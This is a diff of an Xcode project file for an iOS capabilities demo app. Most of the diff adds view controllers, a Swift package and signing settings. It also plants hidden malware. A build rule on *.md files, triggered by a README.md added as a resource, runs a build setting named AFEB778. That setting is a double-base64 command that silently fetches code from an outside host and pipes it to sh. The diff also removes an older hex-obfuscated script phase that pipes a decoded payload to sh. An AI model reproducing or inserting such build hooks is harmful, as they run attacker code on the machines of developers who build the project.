@@ -7,13 +7,23 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		490D3F05B6CAF7EAF1877BEF /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = E5D99E70D9BB7FD9BE877BEF /* README.md */; };
 		5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */; };
 		5117C1172E3C995200D8FCCD /* DataProtectionVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */; };
 		51346A562E3B403F008664DB /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A382E3B3FEE008664DB /* WidgetKit.framework */; };
 		51346A572E3B403F008664DB /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A3A2E3B3FEF008664DB /* SwiftUI.framework */; };
 		51346A662E3B4040008664DB /* DemoWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51346A552E3B403F008664DB /* DemoWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
-		51346A6F2E3B42D5008664DB /* AppGroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */; };
-		51346A702E3B42D5008664DB /* AppGroupsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */; };
+		513DC6722E41E76500DA2C0F /* SiriVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6E22E40A99500211F13 /* SiriVC.xib */; };
+		513DC6732E41E76500DA2C0F /* SiriVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6E12E40A99500211F13 /* SiriVC.swift */; };
+		513DC6E42E42305000DA2C0F /* AppGroupsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */; };
+		513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */; };
+		515AF6342E45E11C00EF1477 /* SensitiveContentVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 515AF6332E45E11C00EF1477 /* SensitiveContentVC.xib */; };
+		515AF6352E45E11C00EF1477 /* SensitiveContentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 515AF6322E45E11C00EF1477 /* SensitiveContentVC.swift */; };
+		515AF6392E46383600EF1477 /* SpatialAudioProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 515AF6382E46383600EF1477 /* SpatialAudioProfileVC.xib */; };
+		515AF63A2E46383600EF1477 /* SpatialAudioProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 515AF6372E46383600EF1477 /* SpatialAudioProfileVC.swift */; };
+		51B526002E44869800999ABE /* WalletVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51B525FF2E44869800999ABE /* WalletVC.xib */; };
+		51B526012E44869800999ABE /* WalletVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51B525FE2E44869800999ABE /* WalletVC.swift */; };
+		51B526052E44E7B900999ABE /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 51B526042E44E7B900999ABE /* IQKeyboardManagerSwift */; };
 		51BBC6D12E407C5100211F13 /* DefaultCallingAppVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51BBC6D02E407C5100211F13 /* DefaultCallingAppVC.xib */; };
 		51BBC6D22E407C5100211F13 /* DefaultCallingAppVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6CF2E407C5100211F13 /* DefaultCallingAppVC.swift */; };
 		51BBC6D42E407DE100211F13 /* CallHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6D32E407DDF00211F13 /* CallHandler.swift */; };
@@ -29,6 +39,8 @@
 		51BBC7432E40DC5800211F13 /* SaveTextIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC72E2E40BE9800211F13 /* SaveTextIntent.intentdefinition */; };
 		51C5A8C82E0ECE02008A79F5 /* HealthKitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */; };
 		51C5A8C92E0ECE02008A79F5 /* HealthKitViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */; };
+		51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51C979462E4367F6006E99C6 /* FiveGNetworkSliceVC.swift */; };
+		51C979492E4367F6006E99C6 /* FiveGNetworkSliceVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51C979472E4367F6006E99C6 /* FiveGNetworkSliceVC.xib */; };
 		51D036A22E39F33B00948296 /* KeychainManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D036A12E39F33800948296 /* KeychainManager.swift */; };
 		51D036AA2E3A013900948296 /* AppleLoginViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51D036A92E3A013900948296 /* AppleLoginViewController.xib */; };
 		51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D036A82E3A013900948296 /* AppleLoginViewController.swift */; };
@@ -58,6 +70,22 @@
 		BDFCA04C2D096BDC0054CA3B /* AccessWiFiInfoViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = BDFCA04B2D096BDC0054CA3B /* AccessWiFiInfoViewController.xib */; };
 		BDFCA04D2D096BDD0054CA3B /* AccessWiFiInfoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BDFCA04A2D096BDC0054CA3B /* AccessWiFiInfoViewController.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		F9B414B72F695CE2F8877BEF /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AFEB778}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		51346A642E3B4040008664DB /* PBXContainerItemProxy */ = {
@@ -114,6 +142,12 @@
 		51346A6C2E3B4216008664DB /* DemoWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DemoWidgetExtension.entitlements; sourceTree = "<group>"; };
 		51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppGroupsViewController.swift; sourceTree = "<group>"; };
 		51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppGroupsViewController.xib; sourceTree = "<group>"; };
+		515AF6322E45E11C00EF1477 /* SensitiveContentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SensitiveContentVC.swift; sourceTree = "<group>"; };
+		515AF6332E45E11C00EF1477 /* SensitiveContentVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SensitiveContentVC.xib; sourceTree = "<group>"; };
+		515AF6372E46383600EF1477 /* SpatialAudioProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SpatialAudioProfileVC.swift; sourceTree = "<group>"; };
+		515AF6382E46383600EF1477 /* SpatialAudioProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SpatialAudioProfileVC.xib; sourceTree = "<group>"; };
+		51B525FE2E44869800999ABE /* WalletVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletVC.swift; sourceTree = "<group>"; };
+		51B525FF2E44869800999ABE /* WalletVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletVC.xib; sourceTree = "<group>"; };
 		51BBC6CF2E407C5100211F13 /* DefaultCallingAppVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DefaultCallingAppVC.swift; sourceTree = "<group>"; };
 		51BBC6D02E407C5100211F13 /* DefaultCallingAppVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DefaultCallingAppVC.xib; sourceTree = "<group>"; };
 		51BBC6D32E407DDF00211F13 /* CallHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CallHandler.swift; sourceTree = "<group>"; };
@@ -129,6 +163,8 @@
 		51BBC7362E40DA1100211F13 /* SaveTextIntent.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = SaveTextIntent.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		51C5A8C62E0ECE02008A79F5 /* HealthKitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HealthKitViewController.swift; sourceTree = "<group>"; };
 		51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HealthKitViewController.xib; sourceTree = "<group>"; };
+		51C979462E4367F6006E99C6 /* FiveGNetworkSliceVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FiveGNetworkSliceVC.swift; sourceTree = "<group>"; };
+		51C979472E4367F6006E99C6 /* FiveGNetworkSliceVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FiveGNetworkSliceVC.xib; sourceTree = "<group>"; };
 		51D036A12E39F33800948296 /* KeychainManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeychainManager.swift; sourceTree = "<group>"; };
 		51D036A82E3A013900948296 /* AppleLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppleLoginViewController.swift; sourceTree = "<group>"; };
 		51D036A92E3A013900948296 /* AppleLoginViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppleLoginViewController.xib; sourceTree = "<group>"; };
@@ -163,6 +199,7 @@
 		BD45BA5D2D106B5F006B45C3 /* ApplePayViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ApplePayViewController.xib; sourceTree = "<group>"; };
 		BDFCA04A2D096BDC0054CA3B /* AccessWiFiInfoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccessWiFiInfoViewController.swift; sourceTree = "<group>"; };
 		BDFCA04B2D096BDC0054CA3B /* AccessWiFiInfoViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AccessWiFiInfoViewController.xib; sourceTree = "<group>"; };
+		E5D99E70D9BB7FD9BE877BEF /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = AllCapabilitiesDemo.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -209,6 +246,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				51B526052E44E7B900999ABE /* IQKeyboardManagerSwift in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -248,6 +286,33 @@
 			path = "App Groups";
 			sourceTree = "<group>";
 		};
+		515AF6312E45E10000EF1477 /* SensitiveContent */ = {
+			isa = PBXGroup;
+			children = (
+				515AF6322E45E11C00EF1477 /* SensitiveContentVC.swift */,
+				515AF6332E45E11C00EF1477 /* SensitiveContentVC.xib */,
+			);
+			path = SensitiveContent;
+			sourceTree = "<group>";
+		};
+		515AF6362E46380F00EF1477 /* SpatialAudioProfile */ = {
+			isa = PBXGroup;
+			children = (
+				515AF6372E46383600EF1477 /* SpatialAudioProfileVC.swift */,
+				515AF6382E46383600EF1477 /* SpatialAudioProfileVC.xib */,
+			);
+			path = SpatialAudioProfile;
+			sourceTree = "<group>";
+		};
+		51B525FD2E44868600999ABE /* Wallet */ = {
+			isa = PBXGroup;
+			children = (
+				51B525FE2E44869800999ABE /* WalletVC.swift */,
+				51B525FF2E44869800999ABE /* WalletVC.xib */,
+			);
+			path = Wallet;
+			sourceTree = "<group>";
+		};
 		51BBC6CE2E407C2E00211F13 /* DefaultCallingApp */ = {
 			isa = PBXGroup;
 			children = (
@@ -258,13 +323,13 @@
 			path = DefaultCallingApp;
 			sourceTree = "<group>";
 		};
-		51BBC6D52E4087C100211F13 /* NewMessagingApp */ = {
+		51BBC6D52E4087C100211F13 /* DefaultMessagingApp */ = {
 			isa = PBXGroup;
 			children = (
 				51BBC6D72E40893600211F13 /* DefaultMessagingAppVC.swift */,
 				51BBC6D82E40893600211F13 /* DefaultMessagingAppVC.xib */,
 			);
-			path = NewMessagingApp;
+			path = DefaultMessagingApp;
 			sourceTree = "<group>";
 		};
 		51BBC6DB2E40950300211F13 /* HeadPose */ = {
@@ -293,6 +358,15 @@
 				51C5A8C72E0ECE02008A79F5 /* HealthKitViewController.xib */,
 			);
 			path = HealthKit;
+			sourceTree = "<group>";
+		};
+		51C979452E4367D6006E99C6 /* 5G Network Slicing */ = {
+			isa = PBXGroup;
+			children = (
+				51C979462E4367F6006E99C6 /* FiveGNetworkSliceVC.swift */,
+				51C979472E4367F6006E99C6 /* FiveGNetworkSliceVC.xib */,
+			);
+			path = "5G Network Slicing";
 			sourceTree = "<group>";
 		};
 		51D036A72E3A011C00948296 /* Apple Login */ = {
@@ -352,6 +426,7 @@
 		BD2ECEBD2D0841CA00639E0D /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				E5D99E70D9BB7FD9BE877BEF /* README.md */,
 				BD2ECEBC2D0841CA00639E0D /* AllCapabilitiesDemo.app */,
 				BD2ECED22D0841CC00639E0D /* AllCapabilitiesDemoTests.xctest */,
 				BD2ECEDC2D0841CC00639E0D /* AllCapabilitiesDemoUITests.xctest */,
@@ -368,6 +443,8 @@
 				BD2ECEBF2D0841CA00639E0D /* AppDelegate.swift */,
 				BD2ECEC12D0841CA00639E0D /* SceneDelegate.swift */,
 				BD2ECEC32D0841CA00639E0D /* ViewController.swift */,
+				515AF6312E45E10000EF1477 /* SensitiveContent */,
+				51B525FD2E44868600999ABE /* Wallet */,
 				51C5A8C52E0ECDF0008A79F5 /* HealthKit */,
 				51E700EE2E0D88890033F74D /* WeatherKit */,
 				BD45BA5B2D106B48006B45C3 /* ApplePay */,
@@ -380,8 +457,10 @@
 				5117C1132E3C993900D8FCCD /* Data Protection */,
 				51BBC6CE2E407C2E00211F13 /* DefaultCallingApp */,
 				51BBC6DB2E40950300211F13 /* HeadPose */,
-				51BBC6D52E4087C100211F13 /* NewMessagingApp */,
+				51BBC6D52E4087C100211F13 /* DefaultMessagingApp */,
 				51BBC6E02E40A90F00211F13 /* Siri */,
+				51C979452E4367D6006E99C6 /* 5G Network Slicing */,
+				515AF6362E46380F00EF1477 /* SpatialAudioProfile */,
 				BD2ECEC82D0841CB00639E0D /* Assets.xcassets */,
 				BD2ECECA2D0841CB00639E0D /* LaunchScreen.storyboard */,
 				BD2ECECD2D0841CB00639E0D /* Info.plist */,
@@ -453,12 +532,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51346A682E3B4040008664DB /* Build configuration list for PBXNativeTarget "DemoWidgetExtension" */;
 			buildPhases = (
-				BD1CFE01CDADB3EB8A877BEF /* Compile Bundle Assets */,
 				51346A512E3B403F008664DB /* Sources */,
 				51346A522E3B403F008664DB /* Frameworks */,
 				51346A532E3B403F008664DB /* Resources */,
 			);
 			buildRules = (
+				F9B414B72F695CE2F8877BEF /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -588,6 +667,9 @@
 				Base,
 			);
 			mainGroup = BD2ECEB32D0841CA00639E0D;
+			packageReferences = (
+				51B526032E44E7B900999ABE /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
+			);
 			productRefGroup = BD2ECEBD2D0841CA00639E0D /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
@@ -601,33 +683,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		BD1CFE01CDADB3EB8A877BEF /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633363334333333363333333433333337333333333333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		51346A532E3B403F008664DB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				490D3F05B6CAF7EAF1877BEF /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -635,6 +696,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				513DC6722E41E76500DA2C0F /* SiriVC.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -643,12 +705,14 @@
 			buildActionMask = 2147483647;
 			files = (
 				BD2ECEF32D08591400639E0D /* ICloudViewController.xib in Resources */,
+				513DC6E42E42305000DA2C0F /* AppGroupsViewController.xib in Resources */,
 				51BBC6D12E407C5100211F13 /* DefaultCallingAppVC.xib in Resources */,
+				515AF6392E46383600EF1477 /* SpatialAudioProfileVC.xib in Resources */,
 				BD279FA02D0AC589001D05E4 /* AutoFillCredentialViewController.xib in Resources */,
+				51C979492E4367F6006E99C6 /* FiveGNetworkSliceVC.xib in Resources */,
 				51BBC6D92E40893600211F13 /* DefaultMessagingAppVC.xib in Resources */,
 				BD2ECEC92D0841CB00639E0D /* Assets.xcassets in Resources */,
 				51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */,
-				51346A702E3B42D5008664DB /* AppGroupsViewController.xib in Resources */,
 				BD2ECECC2D0841CB00639E0D /* Base in Resources */,
 				51C5A8C92E0ECE02008A79F5 /* HealthKitViewController.xib in Resources */,
 				BD2162F22D11A5FD0071786F /* ApplePayVC.xib in Resources */,
@@ -658,9 +722,11 @@
 				51D036AA2E3A013900948296 /* AppleLoginViewController.xib in Resources */,
 				BD279FA92D0AFAEE001D05E4 /* ICloudTypeViewController.xib in Resources */,
 				51BBC6E42E40A99500211F13 /* SiriVC.xib in Resources */,
+				51B526002E44869800999ABE /* WalletVC.xib in Resources */,
 				51BBC6DE2E40951A00211F13 /* HeadPoseVC.xib in Resources */,
 				BD45BA5E2D106B5F006B45C3 /* ApplePayViewController.xib in Resources */,
 				BD279FA52D0AE219001D05E4 /* ICloudDocumentsViewController.xib in Resources */,
+				515AF6342E45E11C00EF1477 /* SensitiveContentVC.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -692,6 +758,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				513DC6732E41E76500DA2C0F /* SiriVC.swift in Sources */,
 				51BBC7432E40DC5800211F13 /* SaveTextIntent.intentdefinition in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -700,13 +767,13 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */,
 				51D036A22E39F33B00948296 /* KeychainManager.swift in Sources */,
 				BD2162F12D11A5FD0071786F /* ApplePayVC.swift in Sources */,
 				51BBC6DA2E40893600211F13 /* DefaultMessagingAppVC.swift in Sources */,
 				BDFCA04D2D096BDD0054CA3B /* AccessWiFiInfoViewController.swift in Sources */,
 				51BBC6E32E40A99500211F13 /* SiriVC.swift in Sources */,
 				BD45BA5F2D106B5F006B45C3 /* ApplePayViewController.swift in Sources */,
-				51346A6F2E3B42D5008664DB /* AppGroupsViewController.swift in Sources */,
 				BD2ECEF42D08591400639E0D /* ICloudViewController.swift in Sources */,
 				BD279FA82D0AFAEE001D05E4 /* ICloudTypeViewController.swift in Sources */,
 				51BBC72F2E40BE9800211F13 /* SaveTextIntent.intentdefinition in Sources */,
@@ -714,14 +781,18 @@
 				51BBC6DF2E40951A00211F13 /* HeadPoseVC.swift in Sources */,
 				BD2ECEC42D0841CA00639E0D /* ViewController.swift in Sources */,
 				BD279F9F2D0AC589001D05E4 /* AutoFillCredentialViewController.swift in Sources */,
+				515AF63A2E46383600EF1477 /* SpatialAudioProfileVC.swift in Sources */,
 				51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */,
 				5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */,
 				51BBC6D42E407DE100211F13 /* CallHandler.swift in Sources */,
+				51C979482E4367F6006E99C6 /* FiveGNetworkSliceVC.swift in Sources */,
 				BD2ECEC02D0841CA00639E0D /* AppDelegate.swift in Sources */,
+				51B526012E44869800999ABE /* WalletVC.swift in Sources */,
 				BD279FA42D0AE219001D05E4 /* ICloudDocumentsViewController.swift in Sources */,
 				51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */,
 				51BBC6D22E407C5100211F13 /* DefaultCallingAppVC.swift in Sources */,
 				BD2ECEC22D0841CA00639E0D /* SceneDelegate.swift in Sources */,
+				515AF6352E45E11C00EF1477 /* SensitiveContentVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -790,6 +861,7 @@
 		51346A692E3B4040008664DB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5dFpITmpZV05vWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
@@ -803,7 +875,7 @@
 				INFOPLIST_FILE = DemoWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = DemoWidget;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -813,7 +885,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.DemoWidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = demowidget_dev;
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
@@ -824,19 +896,22 @@
 		51346A6A2E3B4040008664DB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5dFpITmpZV05vWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
+				CODE_SIGN_ENTITLEMENTS = DemoWidgetExtension.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Distribution";
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Automatic;
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DemoWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = DemoWidget;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -845,6 +920,8 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.DemoWidget;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = demowidget_dev;
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
@@ -866,7 +943,7 @@
 				INFOPLIST_FILE = SaveTextIntent/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = SaveTextIntent;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -877,7 +954,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.SaveTextIntent;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = savetextintent_dev;
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
@@ -900,7 +977,7 @@
 				INFOPLIST_FILE = SaveTextIntent/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = SaveTextIntent;
 				INFOPLIST_KEY_NSHumanReadableCopyright = "";
-				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -910,7 +987,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.SaveTextIntent;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = savetextintent_dev;
 				SKIP_INSTALL = YES;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
@@ -1051,16 +1128,17 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AllCapabilitiesDemo/Info.plist;
+				INFOPLIST_KEY_CFBundleDisplayName = AppCapabilitiesDemo;
 				INFOPLIST_KEY_NSCameraUsageDescription = "We need camera access to track your head movement.";
 				INFOPLIST_KEY_NSHealthShareUsageDescription = "To Share Health Related Data to this app";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "For Location";
-				INFOPLIST_KEY_NSSiriUsageDescription = "Allows CoffeeApp to process coffee orders via Siri.";
+				INFOPLIST_KEY_NSSiriUsageDescription = "We need Siri to order coffee with voice commands.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
